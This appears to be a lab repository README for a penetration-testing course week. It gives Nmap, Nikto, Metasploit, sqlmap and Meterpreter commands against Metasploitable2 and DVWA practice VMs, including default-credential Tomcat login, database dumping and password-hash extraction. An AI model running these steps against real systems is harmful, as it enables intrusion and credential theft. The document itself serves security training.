# cyart-vapt-team
# CYART VAPT Team – Week 2

## Overview
This repository contains artifacts and documentation for **Week 2 Vulnerability Assessment and Penetration Testing (VAPT) exercises**.  
The goal of these labs is to perform a **full VAPT cycle** on controlled lab environments, following PTES methodology:  

**Phases Covered:**
1. Reconnaissance (OSINT, asset mapping)
2. Vulnerability Scanning (Nmap, Nikto, OpenVAS/GVM)
3. Exploitation (Metasploit, sqlmap, Burp Suite)
4. Post-Exploitation (privilege escalation, evidence collection)
5. Reporting & Remediation Recommendations

**Lab Targets:**
- Metasploitable2 VM – 192.168.1.100  
- DVWA VM – 192.168.1.200  

---

## Folder Structure

Week 2/
├── Documentation/
│ ├── PDF
├── screenshots/
│ ├── ping_192-168-1-100.png
│ ├── nmap_quick.png
│ ├── nmap_services.png
│ ├── nikto_http.png
│ ├── metasploit_session.png
│ ├── burp_intercept.png
│ └── maltego_graph.png
├── OUTPUT/
└── README.md

markdown
Copy code

---

## Tools Used
- **Kali Linux** – Attacker OS  
- **Nmap** – Network discovery and vulnerability scanning  
- **Nikto** – Web server vulnerability scanning  
- **OpenVAS / GVM** – Comprehensive vulnerability scanning and reporting  
- **Metasploit Framework** – Exploitation and post-exploitation  
- **sqlmap** – Automated SQL injection testing  
- **Burp Suite** – Web request interception and fuzzing  
- **Sublist3r** – Subdomain enumeration  
- **Shodan** – Public exposure discovery  
- **WhatWeb / Wappalyzer** – Technology stack identification  
- **Maltego** – OSINT and asset mapping  

---

## Step-by-Step Workflow

### 1. Reconnaissance
- WHOIS lookup: `whois example.com`  
- Subdomain enumeration: `sublist3r -d example.com -o recon/sublist3r_output.txt`  
- Tech stack identification: `whatweb http://dev.example.com` or Wappalyzer  
- Public exposure scan via Shodan  
- Asset mapping in Maltego, exported graph in `screenshots/maltego_graph.png`  
- Document findings in **Slack-friendly asset log**  

### 2. Vulnerability Scanning
- Nmap scans:
  ```bash
  sudo nmap -sS -Pn 192.168.1.100 -oN scans/nmap_quick.txt
  sudo nmap -sV -sC -p- 192.168.1.100 -oN scans/nmap_services.txt
  sudo nmap -O 192.168.1.100 -oN scans/nmap_os.txt
  sudo nmap --script vuln 192.168.1.100 -oN scans/nmap_vuln.txt
Web scanning with Nikto:

bash
Copy code
nikto -h http://192.168.1.100 -output scans/nikto_output.txt
nikto -h https://192.168.1.100 -ssl -output scans/nikto_https.txt
OpenVAS scan: configure target 192.168.1.100 → run full scan → export PDF scans/openvas_report.pdf

3. Exploitation
Metasploit:

bash
Copy code
msfconsole
use exploit/multi/http/tomcat_mgr_login
set RHOSTS 192.168.1.100
set RPORT 8080
set USERNAME manager
set PASSWORD password
set TARGETURI /manager/html
run
SQL Injection with sqlmap:

bash
Copy code
sqlmap -u "http://192.168.1.200/vulnerabilities/sqli/?id=1&Submit=Submit" --level=5 --risk=3 --dump --output-dir=exploits/sqlmap_output
Burp Suite: intercept, test, and fuzz web requests; save PoCs

4. Post-Exploitation
Meterpreter commands: sysinfo, getuid, hashdump (lab only)

Privilege escalation (Windows example): Metasploit local exploit bypassuac

Evidence collection and hashing:

bash
Copy code
download C:\\path\\to\\target.conf /root/collected/target.conf
sha256sum /root/collected/target.conf > /root/collected/target.conf.sha256
Memory and forensics (Volatility) → save outputs

5. Reporting
Compile scan outputs, PoC screenshots, evidence hashes

PTES-style report: reports/PTES_Report_Week2.pdf

Executive summary (non-technical): reports/Executive_Summary.txt

Prioritization Table Example
Scan ID	Vulnerability	CVSS Score	Priority	Host
001	SQL Injection	9.1	Critical	192.168.1.20
002	Open Port 445 (SMB)	6.5	Medium	192.168.1.30
003	Tomcat RCE	9.8	Critical	192.168.1.100

Evidence Table Example
Item	Description	Collected By	Date	Hash Value
Config File	target.conf	VAPT Analyst	2025-08-18	d4c3...SHA256

Safety & Best Practices
Only perform testing on authorized lab targets.

Avoid destructive exploits unless explicitly allowed.

Redact sensitive data in shared reports.

Timestamp all activities and maintain raw outputs for traceability.

GitHub Submission
Repository: cyart-vapt-team

Branch: main

Folder: Week 2 contains all scans, screenshots, reports, and evidence.

README serves as the central documentation for the lab workflow.

